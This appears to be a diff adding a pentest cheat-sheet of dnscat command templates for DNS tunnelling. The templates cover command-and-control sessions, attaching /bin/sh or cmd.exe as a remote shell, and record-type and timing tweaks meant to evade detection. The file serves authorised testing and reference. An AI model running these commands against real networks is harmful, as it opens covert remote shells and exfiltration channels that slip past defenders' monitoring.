@@ -1,0 +1,78 @@
+tool: dnscat
+tags: [network, dns, exfiltration, c2, security, pentest, tunnel]
+
+actions:
+# === BASIC CONNECTIVITY ===
+ - title: dnscat - basic command session
+   desc: |
+     Establishes a default interactive command session with a dnscat server over DNS. 
+     This mode is the most common way to start a C2 (Command and Control) channel through DNS queries. 
+     It uses the system's default DNS settings to resolve the specified domain and communicate with the listener.
+   command: "dnscat --dns domain={{domain}}"
+
+ - title: dnscat - connectivity ping
+   desc: |
+     Performs a simple connectivity check to verify if a dnscat server is listening on the target domain. 
+     Use this to troubleshoot connection issues or verify the environment's DNS egress before attempting a full session. 
+     If the server responds, it indicates that DNS traffic is successfully reaching the controller.
+   command: "dnscat --dns domain={{domain}} --ping"
+
+# === SHELLS AND EXECUTION ===
+ - title: dnscat - execute process (bind shell)
+   desc: |
+     Executes a specific process on the client and links its input/output to the DNS stream. 
+     This is commonly used to provide a remote shell (like /bin/sh or cmd.exe) to the dnscat server. 
+     Be aware that this exposes the client's command line to the server administrator.
+   command: "dnscat --dns domain={{domain}} --exec {{process|/bin/sh}}"
+
+ - title: dnscat - interactive console mode
+   desc: |
+     Starts a session where input and output are sent directly to the local console. 
+     This mode is useful for manual data transfer or direct communication between the client and server operators. 
+     It bypasses the default 'command' session logic to provide a raw data stream.
+   command: "dnscat --dns domain={{domain}} --console"
+
+# === SECURITY AND AUTHENTICATION ===
+ - title: dnscat - authenticated session with secret
+   desc: |
+     Sets a shared secret to enable encryption and prevent man-in-the-middle (MITM) attacks. 
+     The same secret must be configured on both the client and the server for the connection to succeed. 
+     This is highly recommended for production or sensitive engagements to ensure session integrity.
+   command: "dnscat --dns domain={{domain}} --secret {{secret_key}}"
+
+ - title: dnscat - disable encryption
+   desc: |
+     Explicitly disables all encryption and authentication for the DNS session. 
+     Use this only for debugging or in environments where the encryption overhead causes significant performance issues. 
+     Note that all transmitted data will be visible in plaintext to anyone monitoring the DNS traffic.
+   command: "dnscat --dns domain={{domain}} --no-encryption"
+
+# === NETWORK TUNING ===
+ - title: dnscat - custom upstream DNS server
+   desc: |
+     Forces the client to send DNS queries to a specific upstream server instead of the system default. 
+     This is useful when you need to bypass a restrictive local DNS resolver or target a specific internal nameserver. 
+     The server parameter specifies the IP address of the DNS resolver to use for the tunnel.
+   command: "dnscat --dns domain={{domain}},server={{dns_server|8.8.8.8}}"
+
+ - title: dnscat - specify DNS record types
+   desc: |
+     Restricts the tunnel to use specific DNS record types such as TXT, MX, or CNAME. 
+     Different environments may monitor or block certain record types, so switching can help with evasion. 
+     You can provide a single type or a comma-separated list of preferred types.
+   command: "dnscat --dns domain={{domain}},type={{record_types|TXT,CNAME,MX}}"
+
+ - title: dnscat - stealth and timing control
+   desc: |
+     Adjusts the delay between packets and forces a steady transmission rate to avoid detection. 
+     Increasing the delay can help bypass basic rate-limiting or anomaly detection systems. 
+     The steady flag ensures the client waits the full delay period even if a response is received immediately.
+   command: "dnscat --dns domain={{domain}} --delay {{delay_ms|2000}} --steady"
+
+# === DEBUGGING ===
+ - title: dnscat - packet trace debugging
+   desc: |
+     Enables detailed packet tracing to display every incoming and outgoing dnscat packet. 
+     This is essential for debugging complex network paths or understanding how the protocol is being handled by intermediate firewalls. 
+     It provides a granular view of the hex-encoded data being sent over the DNS protocol.
+   command: "dnscat --dns domain={{domain}} --packet-trace"
